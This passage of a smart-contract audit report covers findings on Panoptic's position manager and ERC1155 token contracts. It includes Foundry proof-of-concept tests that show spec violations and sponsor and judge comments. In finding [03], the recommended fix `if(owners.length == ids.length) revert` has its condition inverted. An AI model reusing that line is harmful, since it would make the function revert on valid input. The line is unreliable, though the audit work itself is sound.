https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1222C2-L1228C15

The earned fees and the burnt liquidities are collected by calling the [`UniswapV3Pool.collect()`](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L490C5-L513C6) function in the `SemiFungiblePositionManager::_collectAndWritePositionData()` function.

The SFPM contract provides the requested amounts while calling the UniswapV3 pool. These requested amounts include fees and burnt liquidity, and they are provided with `amountToCollect.rightSlot()` and `amountToCollect.leftSlot()`.

```solidity
File: SemiFungiblePositionManager.sol
// function _collectAndWritePositionData
       ...
            (uint128 receivedAmount0, uint128 receivedAmount1) = univ3pool.collect( // @audit what if the received amounts are different than the requested amounts?
                msg.sender,
                liquidityChunk.tickLower(),
                liquidityChunk.tickUpper(),
                uint128(amountToCollect.rightSlot()), // amount0requested
                uint128(amountToCollect.leftSlot()) // amount1requested
            );
```

The UniswapV3Pool [checks the requested amounts compared to the owed amounts](https://github.com/Uniswap/v3-core/blob/d8b1c635c275d2a9450bd6a78f3fa2484fef73eb/contracts/UniswapV3Pool.sol#L498C1-L501C101) to the position and transfers tokens.

```solidity
// UniswapV3Pool.sol

->      Position.Info storage position = positions.get(msg.sender, tickLower, tickUpper); //@audit Position owner is the SFPM contract

        amount0 = amount0Requested > position.tokensOwed0 ? position.tokensOwed0 : amount0Requested;
        amount1 = amount1Requested > position.tokensOwed1 ? position.tokensOwed1 : amount1Requeste
```

The owner of the position is the SFPM contract itself. So, it is normal to assume that the owed amounts to SFPM will be greater than the user's requested amounts and these requested amounts will be transferred correctly.

However, it would be better to check if the actual transferred amounts are equal to the requested amounts as an invariant check. It might be an extremely rare case, but there is no way to collect the remaining owed tokens in that case since the SFPM doesn't have a specific function to call the UniswapV3 collect function.

### Recommendation

```solidity
if (receivedAmount0 != amountToCollect.rightSlot() || receivedAmount1 != amountToCollect.leftSlot()) revert
```

## [03] Input array lengths in `ERC1155Minimal::balanceOfBatch` is not checked

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/tokens/ERC1155Minimal.sol#L174

```solidity
File: ERC1155Minimal.sol
    /// @notice Query balances for multiple users and tokens at once
--> /// @dev owners and ids must be of equal length //@audit it is not checked in the code below.
    /// @param owners the users to query balances for
    /// @param ids the ERC1155 token ids to query
    /// @return balances the balances for each user-token pair in the same order as the input
    function balanceOfBatch(
        address[] calldata owners,
        uint256[] calldata ids
    ) public view returns (uint256[] memory balances) {
        balances = new uint256[](owners.length);

        // Unchecked because the only math done is incrementing
        // the array index counter which cannot possibly overflow.
        unchecked {
            for (uint256 i = 0; i < owners.length; ++i) {
                balances[i] = balanceOf[owners[i]][ids[i]];
            }
        }
    }
```

As we can see in the developer's comment above, **owners and ids must be of equal length.** However, the equality of these parameters is not checked at all in the code.

According to the [EIP-1155 standard](https://eips.ethereum.org/EIPS/eip-1155), these parameters are not strictly required to be equal for the `balanceOfBatch` function (*Different than the* `safeBatchTransferFrom` *where all inputs MUST be equal length*).

As you can see [here](https://github.com/transmissions11/solmate/blob/e8f96f25d48fe702117ce76c79228ca4f20206cb/src/tokens/ERC1155.sol#L124), it is checked in Solady implementation.

### Recommendation

Consider adding a check similar to Solady's implementation:

```diff
+        if(owners.length == ids.length) revert
```

## [04] Possible missing function in `LeftRight.sol` library

[LeftRight library](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/LeftRight.sol) is used to pack two separate data (each 128-bit) into a single 256-bit slot. There are multiple functions to add values to the right slot and left slot.

The functions to add value to the **right slot** are:

- `toRightSlot(uint256 self, uint128 right)`
- `toRightSlot(uint256 self, int128 right)`
- `toRightSlot(int256 self, uint128 right)`
- `toRightSlot(int256 self, int128 right)`

The functions to add value to the **left slot** are:

- `toLeftSlot(uint256 self, uint128 left)`
- `toLeftSlot(int256 self, uint128 left)`
- `toLeftSlot(int256 self, int128 left)`
    

When we compare it to right slot functions, it looks like the function with "**uint256** self" and "**int128** left" parameters is missing.

### Recommendation

Consider adding a function called `toLeftSlot(uint256 self, int128 left)`, if necessary.

## [05] Misleading comments related to `positionKey`

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L175

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L292

```solidity
SemiFungiblePositionManager.sol
175.    /// @dev mapping that stores the liquidity data of keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))
292.    /// @dev mapping that stores a LeftRight packing of feesBase of  keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))
```

Developer comments regarding position key encoding in lines 175 and 292 are misleading. These comments include only 4 elements (`poolAddress`, `owner`, `tickLower` and `tickUpper`) for encoding. However, there is one more element in the [actual implementation](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L594C13-L601C18), which is **tokenType.**

## [06] Slippage tick limits for swaps can be inclusive

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L713

Users provide upper and lower tick limits for swaps when minting in-the-money positions.

In the current implementation, the transaction reverts if the new tick after the swap touches the slippage limits. However, these limits should be inclusive and the transaction should revert if these limits are passed.

### Recommendation

```diff
713. -         if ((newTick >= tickLimitHigh) || (newTick <= tickLimitLow)) revert Errors.PriceBoundFail();
713. +         if ((newTick > tickLimitHigh) || (newTick < tickLimitLow)) revert Errors.PriceBoundFail();
```

## [07] NatSpec `@return` explanation is incorrect in `_createPositionInAMM()` function

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L846

```solidity
    /// @return totalMoved the total amount of liquidity moved from the msg.sender to Uniswap
--> /// @return totalCollected the total amount of liquidity collected from Uniswap to msg.sender //@audit It is not total liquidity collected, it is total fees collected.
    /// @return itmAmounts the amount of tokens swapped due to legs being in-the-money
    function _createPositionInAMM(
```

The comment regarding `totalCollected` parameter is incorrect. The returned value is not the total amount of liquidity collected from Uniswap. It is only the collected fee amount.

Received amounts from Uniswap include "fees + burnt liquidity". Burnt liquidity amounts are subtracted from the received amounts and the collected amounts are calculated in `_collectAndWritePositionData()` function.

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1231C1-L1244C85

```solidity
file: SemiFungiblePositionManager.sol
// function _collectAndWritePositionData
            uint128 collected0;
            uint128 collected1;
            unchecked {
                collected0 = movedInLeg.rightSlot() < 0
-->                 ? receivedAmount0 - uint128(-movedInLeg.rightSlot())
                    : receivedAmount0;
                collected1 = movedInLeg.leftSlot() < 0
-->                 ? receivedAmount1 - uint128(-movedInLeg.leftSlot())
                    : receivedAmount1;
            }


            // CollectedOut is the amount of fees accumulated+collected (received - burnt)
-->         // That's because receivedAmount contains the burnt tokens and whatever amount of fees collected
            collectedOut = int256(0).toRightSlot(collected0).toLeftSlot(collected1);
```

## [08] Misleading comment in `_mintLiquidity()` function

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1158C1-L1158C101

```solidity
file: SemiFungiblePositionManager.sol
// _mintLiquidity function

-->     // from msg.sender to the uniswap pool, stored as negative value to represent amount debited //@audit It is not negative 
        movedAmounts = int256(0).toRightSlot(int128(int256(amount0))).toLeftSlot(
            int128(int256(amount1))
        );
```

The comment above `movedAmounts` mentioned that the amounts are stored as negative values. However, both `amount0` and `amount1` are returned values of the Uniswap `mint` function, and [they are positive uint256 values](https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1147).

## [09] No need to wrap `uniV3pool` parameter in `getAccountPremium` function

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1381C30-L1381C48

```solidity
    function getAccountPremium(
-->     address univ3pool,
        address owner,
        uint256 tokenType,
        int24 tickLower,
        int24 tickUpper,
        int24 atTick,
        uint256 isLong
    ) external view returns (uint128 premiumToken0, uint128 premiumToken1) {
        bytes32 positionKey = keccak256(
-->         abi.encodePacked(address(univ3pool), owner, tokenType, tickLower, tickUpper) //@audit QA - univ3pool parameter is already address not IUniV3Pool. No need to do "address(univ3pool)"
        );
```

`univ3pool` parameter is already an `address`, not `IUniswapV3Pool`. Therefore, there is no need to do `address(univ3pool)`.

## [10] NatSpec `@return` comment is incorrect in `_getPremiaDeltas()` function

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/SemiFungiblePositionManager.sol#L1253C1-L1254C147

```solidity
    /// @return deltaPremiumOwed The extra premium (per liquidity X64) to be added to the owed accumulator for token0 (right) and token1 (right)
    /// @return deltaPremiumGross The extra premium (per liquidity X64) to be added to the gross accumulator for token0 (right) and token1 (right)
```

The explanation is: "*... for `token0` (right) and `token1` (right)."*

Both `token0` and `token1` is explained as the right slot in the comments. However, `token1` is on the left slot.

**[dyedm1 (Panoptic) confirmed](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481#issuecomment-1859294013)**

## [[11] `SemiFungiblePositionManager` does not comply with the ERC1155 standard due to not reverting on transfer to zero address](https://github.com/code-423n4/2023-11-panoptic-findings/issues/214)

*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481#issuecomment-1875219281), this downgraded issue from the same warden has been included in this report for completeness.*

### Lines of code

https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/tokens/ERC1155Minimal.sol#L110-L117<br>
https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/tokens/ERC1155Minimal.sol#L163-L170

### Impact

`ERC1155Minimal` contract and `SemiFungiblePositionManager` don't comply with ERC1155 token standard.

### Proof of Concept

`SemiFungiblePositionManager` is the ERC1155 version of Uniswap's `NonFungiblePositionManager` contract and it is stated that `SemiFungiblePositionManager` should comply with the ERC1155.

EIP-1155 and all the rules for this token standard can be found here:  
[https://eips.ethereum.org/EIPS/eip-1155](https://eips.ethereum.org/EIPS/eip-1155)

Let's check **safeTransferFrom rules:**

> 
> MUST revert if `_to` is the zero address.
> 
    
However, `ERC1155Minimal` contract does not revert when `to` is zero address. This contract is modified from the Solmate to be more gas efficient, but the transfer to zero address is missed while modifying.

[Here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/tokens/ERC1155Minimal.sol#L90C5-L118C6) is the `ERC1155Minimal` contract:  

```solidity
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata data
    ) public {
        if (!(msg.sender == from || isApprovedForAll[from][msg.sender])) revert NotAuthorized();

        balanceOf[from][id] -= amount;

        // balance will never overflow
        unchecked {
            balanceOf[to][id] += amount;
        }

        afterTokenTransfer(from, to, id, amount);

        emit TransferSingle(msg.sender, from, to, id, amount);

-->     if (to.code.length != 0) { //@audit-issue according to EIP-1155, it MUST revert if "to" is zero address. This check is missing.
            if (
                ERC1155Holder(to).onERC1155Received(msg.sender, from, id, amount, data) !=
                ERC1155Holder.onERC1155Received.selector
            ) {
                revert UnsafeRecipient();
            }
        }
    }
```

As you can see above, there is no check regarding `to` address being zero, which is not EIP-compliant.

The EIP-compliant version of Solmate can be seen [here](https://github.com/transmissions11/solmate/blob/4b47a19038b798b4a33d9749d25e570443520647/src/tokens/ERC1155.sol#L70C1-L71C35):  

```solidity
// Solmate safeTransferFrom:
        require(
            to.code.length == 0
                ? to != address(0)
                : // ...
```

The EIP-compliant version on OpenZeppelin can be seen [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ef699fa6a224de863ffe48347a5ab95d3d8ba2ba/contracts/token/ERC1155/ERC1155.sol#L226C9-L228C10):  


```solidity
// OZ _safeTransferFrom:
        if (to == address(0)) {
            revert ERC1155InvalidReceiver(address(0));
        }
```

### Coded PoC

The code snippet below shows successful transfer action to zero address.
You can use protocol's test suite to run it
- Copy the snippet and paste it in the `SemiFungiblePositionManager.t.sol` test file.
- Run it with `forge test --match-test testSuccess_afterTokenTransfer_Single_ToAddressIsZero -vvv`:

```solidity
function testSuccess_afterTokenTransfer_Single_ToAddressIsZero(
        uint256 x,
        uint256 widthSeed,
        int256 strikeSeed,
        uint256 positionSizeSeed
    ) public {
        // Initial part of this test is the same as the protocol's own tests.
        _initPool(x);

        (int24 width, int24 strike) = PositionUtils.getOutOfRangeSW(
            widthSeed,
            strikeSeed,
            uint24(tickSpacing),
            currentTick
        );

        populatePositionData(width, strike, positionSizeSeed);

        /// position size is denominated in the opposite of asset, so we do it in the token that is not WETH
        uint256 tokenId = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            1,
            0,
            strike,
            width
        );

        sfpm.mintTokenizedPosition(
            tokenId,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Up until this point it is the same setup as the protocol's own single transfer test.
        // We will only change the "to" address to 0.
        sfpm.safeTransferFrom(Alice, address(0), tokenId, positionSize, "");

        // The transfer is completed successfully. However, it MUST have been reverted according to the EIP standard.
        assertEq(sfpm.balanceOf(Alice, tokenId), 0);
        assertEq(sfpm.balanceOf(address(0), tokenId), positionSize);
    }    
```

Result after running the test:

```solidity 
Running 1 test for test/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest
[PASS] testSuccess_afterTokenTransfer_Single_ToAddressIsZero(uint256,uint256,int256,uint256) (runs: 1, μ: 1851440, ~: 1851440)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.16s
 
Ran 1 test suite: 1 test passed, 0 failed, 0 skipped (1 total test)
```

### Recommended Mitigation Steps

Revert if `to` address is zero to comply with ERC1155 token standard.

## [[12] `ERC1155Minimal::safeBatchTransferFrom` **MUST** revert if the length of ids is not the same as the length of amounts to comply with the ERC1155 token standard](https://github.com/code-423n4/2023-11-panoptic-findings/issues/221)

*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481#issuecomment-1875219281), this downgraded issue from the same warden has been included in this report for completeness.*

`ERC1155Minimal` and `SemiFungiblePositionManager` contracts do not comply with ERC1155 token standard.

### Proof of Concept

`SemiFungiblePositionManager` is the ERC1155 version of Uniswap's `NonFungiblePositionManager` contract and it is stated that `SemiFungiblePositionManager` should comply with the ERC1155.

EIP-1155 and all the rules for this token standard can be found here:  
[https://eips.ethereum.org/EIPS/eip-1155](https://eips.ethereum.org/EIPS/eip-1155)

Let's check the **safeBatchTransferFrom rules:**

>
> MUST revert if length of `_ids` is not the same as length of `_values`.
>     

However, `ERC1155Minimal` contract does not check these array lengths and does not revert when there is a mismatch.

This contract is modified from the Solmate to be more gas efficient, but the input length mismatch check is missed while modifying.

[Here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/tokens/ERC1155Minimal.sol#L128C5-L171C6) is the ERC1155Minimal contract `safeBatchTransferFrom` function:  

```solidity
// ERC1155Minimal.sol
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) public virtual {
        if (!(msg.sender == from || isApprovedForAll[from][msg.sender])) revert NotAuthorized();

        // Storing these outside the loop saves ~15 gas per iteration.
        uint256 id;
        uint256 amount;

-->     for (uint256 i = 0; i < ids.length; ) { //@audit-issue according to EIP-1155, it MUST revert if "ids" length is not the same as "amounts" length. There is no check in this function. If amounts.length > ids.length, the function will only iterate "ids.length" times in the for loop but will NOT revert.
            id = ids[i];
            amount = amounts[i];

            balanceOf[from][id] -= amount;

            // balance will never overflow
            unchecked {
                balanceOf[to][id] += amount;
            }

            // An array can't have a total length
            // larger than the max uint256 value.
            unchecked {
                ++i;
            }
        }

        afterTokenTransfer(from, to, ids, amounts);

        emit TransferBatch(msg.sender, from, to, ids, amounts);

        if (to.code.length != 0) {
            if (
                ERC1155Holder(to).onERC1155BatchReceived(msg.sender, from, ids, amounts, data) !=
                ERC1155Holder.onERC1155BatchReceived.selector
            ) {
                revert UnsafeRecipient();
            }
        }
    }
```

As we can see above, there is no check in terms of `ids` length and the `amounts` length.

EIP-1155 compliant version of this implementation on Solmate can be found [here](https://github.com/transmissions11/solmate/blob/4b47a19038b798b4a33d9749d25e570443520647/src/tokens/ERC1155.sol#L85):  

```solidity
// Solmate safeBatchTransferFrom:
   require(ids.length == amounts.length, "LENGTH_MISMATCH");
```

EIP-1155 compliant version of this implementation on OpenZeppelin can be found [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/ef699fa6a224de863ffe48347a5ab95d3d8ba2ba/contracts/token/ERC1155/ERC1155.sol#L148C5-L151C10) (`_safeBatchTransferFrom` will call `_update` function and the check is in this `_update` function):  

```solidity
// OZ _update function (called during batch transfer)
    function _update(address from, address to, uint256[] memory ids, uint256[] memory values) internal virtual {
        if (ids.length != values.length) {
            revert ERC1155InvalidArrayLength(ids.length, values.length);
        }
```

NOTE: I also submitted another EIP compliance issue which is related to `to` address being zero. This issue is a separate breach of the rules and a different root cause. Therefore, I submitted this one as a separate issue since fixing only one of them will not make the contract EIP compliant.

### Coded PoC

The code snippet below shows successful transfer action with mismatching array length. You can use protocol's test suite to run it.
- Copy the snippet and paste it in the `SemiFungiblePositionManager.t.sol` test file.
- Run it with `forge test --match-test testSuccess_afterTokenTransfer_Batch_ArrayLengthsMismatch -vvv`:

```solidity
function testSuccess_afterTokenTransfer_Batch_ArrayLengthsMismatch(
        uint256 x,
        uint256 widthSeed,
        int256 strikeSeed,
        uint256 positionSizeSeed
    ) public {
        // Initial part of this test is the same as the protocol's own tests.
        _initPool(x);

        (int24 width, int24 strike) = PositionUtils.getOutOfRangeSW(
            widthSeed,
            strikeSeed,
            uint24(tickSpacing),
            currentTick
        );

        populatePositionData(width, strike, positionSizeSeed);

        /// position size is denominated in the opposite of asset, so we do it in the token that is not WETH
        uint256 tokenId = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            1,
            0,
            strike,
            width
        );

        sfpm.mintTokenizedPosition(
            tokenId,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        uint256 tokenId2 = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            0,
            0,
            strike,
            width
        );

        sfpm.mintTokenizedPosition(
            tokenId2,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Up until this point it is the same setup as the protocol's own batch transfer test.
        // We will only change the amounts array.
        // TokenIds array length is 2, amounts array length is 3.
        uint256[] memory tokenIds = new uint256[](2);
        tokenIds[0] = tokenId;
        tokenIds[1] = tokenId2;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = positionSize;
        amounts[1] = positionSize;
        amounts[2] = positionSize;
        sfpm.safeBatchTransferFrom(Alice, Bob, tokenIds, amounts, "");

        // The transfer is completed successfully. However, it MUST have been reverted according to the EIP standard.
        assertEq(sfpm.balanceOf(Alice, tokenId), 0);
        assertEq(sfpm.balanceOf(Bob, tokenId), positionSize);
    }
```

Results after running the test:

```solidity
Running 1 test for test/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest
[PASS] testSuccess_afterTokenTransfer_Batch_ArrayLengthsMismatch(uint256,uint256,int256,uint256) (runs: 1, μ: 1981414, ~: 1981414)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.84s
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Recommended Mitigation Steps

I would recommend checking input array lengths and reverting if there is a mismatch.

## [[13] 12-bit is not enough for a leg width](https://github.com/code-423n4/2023-11-panoptic-findings/issues/306)

*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481#issuecomment-1875219281), this downgraded issue from the same warden has been included in this report for completeness.*

The protocol does not enforce a width limit but the maximum possible width can only cover less than 2.5% of the whole tick range (when tick spacing is 10). 
Users might end up extremely small position width due to downcast to 12-bit while trying to cover a wide range of ticks with their position. 

### Proof of Concept

The width of a leg in the token ID is a 12-bit value and this value is added with [`addWidth()`](https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/types/TokenId.sol#L272C5-L285C6) function during token ID construction. Because the width is a 12-bit value, the **biggest value of the width is 4095**.

As we can see [here](https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/types/TokenId.sol#L29), `width = (tickUpper - tickLower) / tickSpacing`.

Supported tick spacings in this protocol are 10, 60 and 200 according to the protocol's audit page.

For a pool with a tick spacing of 10, the maximum tick range a leg can cover is **40950** (this is the max possible value of `tickUpper - tickLower`).

The [max tick](https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/libraries/Constants.sol#L14) in the protocol is: 887272  
The [min tick](https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/libraries/Constants.sol#L11) in the protocol is: -887272

Now let's check the possible tick range for a tick spacing of 10.<br>
max: 887270 (remainder should be 0)<br>
min: -887270  <br>
`tick upper - tick lower` `= 1,774,540`

That value is the maximum difference between ticks. Of course, we are not expecting anyone to cover the whole range. That contradicts the idea of concentrated liquidity.

However, the value of `40950 / 1774540` is just 2.307%. Users can't even cover 2.5% of the possible price range. If a user tries to cover a wide range, that value will be overwritten and the width will be an extremely small value.

The protocol promotes that any token including meme tokens like Shiba or Pepe can be used to create options. There is also this sentence in the protocol's audit page:

> Construction helper functions (prefixed with add) in the TokenId library and other types do not perform extensive input validation. Passing invalid or nonsensical inputs into these functions or attempting to overwrite already filled slots may yield unexpected or invalid results.

It is been stated that **nonsensical** inputs may result in unwanted outcomes. However, trying to cover 2.5% of the price range for a meme token in the bull market **is not nonsensical**. In fact, users should be able to cover much wider ranges in these kinds of tokens.

### Price Examples

Let's check a few pricing examples with these tick ranges. I'll use the price calculation formula described in this [uniswap article](https://support.uniswap.org/hc/en-us/articles/7423663459597-Why-does-the-price-input-automatically-round-).

As I mentioned above, max width is 4095 and max tick range is 40950 _(for tickSpacing 10)._

Prices are calculated based on `1.0001**tick`. When we calculate `1.0001 ** 40950`, we'll see the result of ~60.027. Which means max range a leg can cover is 60x (which is not a big deal for a meme token).

**Example 1:**

For a token with USDC pair:

Tick is 276000 -> price based on the formula: ~1.0329...<br>
Tick is 235000 -> price based on the formula: ~62.314... 

The tick range in above example is 41000, which is bigger than the max range. However the price range is only between 1 and 62 dollars. 

**Example 2:**

The price range in the example above was around 60 dollars. It is much more significant with low priced tokens. Similarly again with USDC pair:

Tick is 299000 -> price based on the formula: ~0.10357...<br>
Tick is 258000 -> price based on the formula: ~6.2483...

It is still 60x price difference but the nominal price range is significantly narrow. 12-bit width leg can't even cover a token price between 0.1 and 6.2 dollars.

I acknowledge users should be careful when trading options. However, a user wanting to mint an option with a price range of 0.1 USD to 10 USD in the bull market conditions is not something unexpected or extremely rare, especially if the token is a volatile one. If a user tries to mint an option this way, they will end up with a much riskier and narrow position.

If the protocol wants to support any token at any price, the width should be bigger than 12-bit (the max possible range (`1774540`) is an 18-bit value). Otherwise, the protocol should warn its users that there is a maximum width restriction.

### Coded PoC

You can use the snippet by copy-pasting it in the `SemiFungiblePositionManager.t.sol`test file:

```solidity
function test_WideRange_Width_Overrriden() public {
        _initPool(1);

        // Create tokenId with wide range. (width 5000 - tickSpacing 10 -> which makes tick range 50000)
        uint256 tokenId = uint256(0).addUniv3pool(poolId).addLeg(
            0, //leg index
            1, // option ratio
            0, // asset
            0, // isLong
            0, // tokenType
            0, // riskPartner
            300000, // strike
            5000 // width
        );

        // Check the actual width
        int24 width = tokenId.width(0);
        console2.log("width: ", width); //--> 904
    }
``` 

### Recommended Mitigation Steps

I would recommend either enforcing max width restriction and informing users in detail on that matter, or using bigger width values. 

### Assessed type

Context

**[dyedm1 (Panoptic) disputed and commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/306#issuecomment-1859308218):**
> I get the point being made here, but we already understand this - which is why we included that bullet point in the known issues, so shouldn't accept this as an issue. 60x is actually quite a huge range even for a memecoin and there is no way an LP will be competitive/profitable at that range as most of the fees will go to narrower LPs.

**[Picodes (judge) commented](https://github.com/code-423n4/2023-11-panoptic-findings/issues/306#issuecomment-1868572928):**
> Downgrading to QA, as it's true that 60x is already wide so I consider this an instance of "function incorrect as to spec, issues with comments" and not of broken functionality.

## [[14] Some token IDs can not be validated due to default riskPartner being zero](https://github.com/code-423n4/2023-11-panoptic-findings/issues/285)

*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-panoptic-findings/issues/481#issuecomment-1875219281), this downgraded issue from the same warden has been included in this report for completeness.*

Tokens with more than one leg without `riskPartner` can't be validated.

### Proof of Concept

Token IDs are created using the [`TokenId.sol`](https://github.com/code-423n4/2023-11-panoptic/blob/main/contracts/types/TokenId.sol) library. Each leg in a token ID includes the asset, option size, whether it is long or short, the token type, risk partner, strike and width.

These values are added to their corresponding bits of a 256-bit ID while creating the token ID and the token IDs are validated using the [`validate()`](https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/types/TokenId.sol#L463-L463) function.

Let's check the developer notes related to risk partners.  

https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/types/TokenId.sol#L130

```solidity
129.    /// @notice Get the associated risk partner of the leg index (generally another leg index in the position).
130.--> /// @notice that returning the riskPartner for any leg is 0 by default, this does not necessarily imply that token 1 (index 0) //@audit if there is no risk partner this value is set to 0.
131.    /// @notice is the risk partner of that leg. We are assuming here that the position has been validated before this and that
132.    /// @notice the risk partner of any leg always makes sense in this way. A leg btw. does not need to have a risk partner.
133.    /// @notice the point here is that this function is very low level and must be used with utmost care because it comes down
134.--> /// @notice to the caller to interpret whether 00 means "no risk partner" or "risk partner leg index 0".
135.    /// @notice But in general we can return 00, 01, 10, and 11 meaning the partner is leg 0, 1, 2, or 3.
136.    /// @param self the tokenId in the SFPM representing an option position
137.    /// @param legIndex the leg index of this position (in {0,1,2,3})
138.    /// @return the leg index of `legIndex`'s risk partner.
139.    function riskPartner(uint256 self, uint256 legIndex) internal pure returns (uint256) {
140.        unchecked {
141.            return uint256((self >> (64 + legIndex * 48 + 10)) % 4);
142.        }
143.    }
```

As we can see above, the default value of the risk partner is 0. However, the risk partner being 0 does not always mean "**no risk partner**". Sometimes it might mean "**risk partner leg index 0**"

The certain thing is that if a leg in token ID does not have a risk partner, it is set to 0.

Now let's check the `validate()` function:

https://github.com/code-423n4/2023-11-panoptic/blob/f4b61b57bdd539f827f3ef7c335c5bde2d5c62a2/contracts/types/TokenId.sol#L487C17-L500C64

```solidity
file: TokenId.sol
// function validate()
        // ...

                // In the following, we check whether the risk partner of this leg is itself
                // or another leg in this position.
                // Handles case where riskPartner(i) != i ==> leg i has a risk partner that is another leg
                uint256 riskPartnerIndex = self.riskPartner(i);
-->             if (riskPartnerIndex != i) { //@audit default is 0 not i. If there is no risk partner it is 0. However, this function expects riskPartnerIndex to be equal to i, not zero.
                    // Ensures that risk partners are mutual
                    if (self.riskPartner(riskPartnerIndex) != i)
                        revert Errors.InvalidTokenIdParameter(3);

       // ...
```

This function checks the risk partner index of the leg and expects it to be equal to itself not zero. However, according to the explanation above "no risk partner" should be 0, not itself.

Let's think about this scenario:  
There is a token with 3 legs. None of these legs have a risk partner and `riskPartner` values for these legs are 0 ("**no risk partner**").

The `validate()` function iterates for every leg:

1. `i`: 0<br>
    `uint256 riskPartnerIndex = self.riskPartner(i)`<br>
    `riskPartnerIndex`: 0<br>
    `if (riskPartnerIndex != i)` =&gt; `0 == 0` function doesn't go in this if statement.

2. `i`: 1<br>
    `uint256 riskPartnerIndex = self.riskPartner(i)`<br>
    `riskPartnerIndex`: 0 (Because "**no risk partner**" was zero).<br>
    `if (riskPartnerIndex != i)` =&gt; `0 != 1` and the function goes in that if statement.<br>

    Inside of this statement:<br>
    `if (self.riskPartner(riskPartnerIndex) != i) revert`, where `selfriskPartner(riskPartnerIndex)` == `self.riskPartner(0)` == `0`<br>
    `0 != i` and the function reverted.
    
The validate function expects "no risk partner" to be the "leg index". This situation contradicts how the token IDs are constructed and this inconsistency will cause some token validations to revert.

I want to point out that the protocol's test files uses "leg index" as risk partner and these tests pass. However, the biggest problem here is that there is no explanation regarding how to use `addRiskPartner()` function in the `TokenId.sol` library. The NatSpec @param `_riskPartner` is missing in `addRiskPartner()` function.

https://github.com/code-423n4/2023-11-panoptic/blob/aa86461c9d6e60ef75ed5a1fe36a748b952c8666/contracts/types/TokenId.sol#L244C5-L248C29 

```solidity
    /// @notice Add the associated risk partner of the leg index (generally another leg in the overall position).
    /// @param self the tokenId in the SFPM representing an option position
    /// @param legIndex the leg index of this position (in {0,1,2,3})
    /// @return the tokenId with riskPartner added to its relevant leg.
